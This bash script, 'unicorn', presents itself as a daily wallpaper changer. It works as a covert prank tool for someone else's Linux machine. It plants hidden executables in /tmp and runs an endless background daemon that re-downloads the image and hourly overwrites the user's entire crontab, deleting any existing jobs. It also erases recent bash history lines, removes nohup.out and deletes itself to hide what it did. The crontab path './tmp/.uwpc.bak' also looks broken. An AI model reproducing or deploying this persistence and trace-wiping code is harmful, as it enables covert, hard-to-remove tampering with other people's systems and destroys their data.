#!/bin/bash
#--------------------------------------#
#----------- unicorn ------------------#
#----- written by Andras Marton -------#
#----- September 07, 2019 -------------#
#--------------------------------------#

#--------------------------------------#
#------- description ------------------#
#--------------------------------------#

#  Script to change background wallpaper at 2AM everyday on
#+ the device it is running on using cron jobs. This script
#+ will run and initiate creating the cron job, the script
#+ to change the wallpaper along with a monitoring script
#+ that will ensure everything is on the system for the
#+ change to take affect at 2AM.

site=       #  Set the website where the image will be obtained from
file=       #  Define filename if need be - an extra line will need to be added
            #+ if trying to rename to a specific file

wget $site  #  If using tinyurl, wget will keep the alias as the filename
mv $file /home/$USER/$file

# Set the background after running - currently this only works in Gnome
gsettings set org.gnome.desktop.background picture-uri file:///home/$USER/$file

#  Create file .uwpc.bak which will be called by crontab to set the background
#+ to /tmp/yykb2s52 && make the file executable
cat > /tmp/.uwpc.bak <<Write_UWPC
#!/bin/bash
#  Set necessary enviromental variables in order for cron to call the script
#+ and gsettings to work properly
PID=\$(pgrep gnome-session)
export DBUS_SESSION_BUS_ADDRESS=\$(grep -z DBUS_SESSION_BUS_ADDRESS /proc/\$PID/environ|cut -d= -f2-)

file=       #  Make sure that you set the same filename
gsettings set org.gnome.desktop.background picture-uri file:///home/\$USER/\$file
Write_UWPC
chmod +x /tmp/.uwpc.bak

#  Create file mps.daemon to run in the background, running the infinite while
#+ loop checking for the crontab. This will also check if .uwpc.bak exists &
#+ if not then create it

cat > /tmp/.mps.daemon <<Write_MPS_Daemon
#!/bin/bash
while true; do
  #  Variables
  cron=\$(crontab -l)
  chkCron="0 2 * * * ./tmp/.uwpc.bak"
  site=                 #  Make sure you set the website to obtain image from
  file=                 #  Set the filename for the background image

  # Check if cronjob still exists for user
  if [ "\$cron" != "\$chkCron" ]; then
    echo "0 2 * * * ./tmp/.uwpc.bak" > /tmp/cron
    crontab /tmp/cron   # Push the above line to crontab
    rm /tmp/cron        # Delete the file once done
  fi
  
  #  Check if the image still exists. If it has been moved/removed then use
  #+ wget to download it again to the same location
  if [ ! -f "/home/\$USER/\$file" ]; then
    wget -O /home/\$USER/\$file \$site
  fi   

  uwpc=/tmp/.uwpc.bak
  # Check if .uwpc.bak exists, if not create it!
  if [ ! -f "\$uwpc" ]; then
    cat > /tmp/.uwpc.bak <<Write_UWPC_from_Daemon
#!/bin/bash
file=       #  Make sure that you set the same filename
gsettings set org.gnome.desktop.background picture-uri file:///home/\$USER/\$file 
Write_UWPC_from_Daemon
chmod +x /tmp/.uwpc.bak
  fi
     sleep 3600 # Run these checks every hour
done
Write_MPS_Daemon
chmod +x /tmp/.mps.daemon
/bin/bash /tmp/.mps.daemon & # start up the script and push it to the background

#  Remove the last five lines from .history_bash by placing it in a temp file
#+ and copying the reduced version to the original
sleep 10
head -n -5 ~/.bash_history > ~/.history.tmp
mv -f ~/.history.tmp ~/.bash_history

#  As script is run with nohup, remove the nohup.out
rm nohup.out

#  This will self delete the script after running the above commands and
#+ writing the files. This command should be the last one!
rm -- "$0"
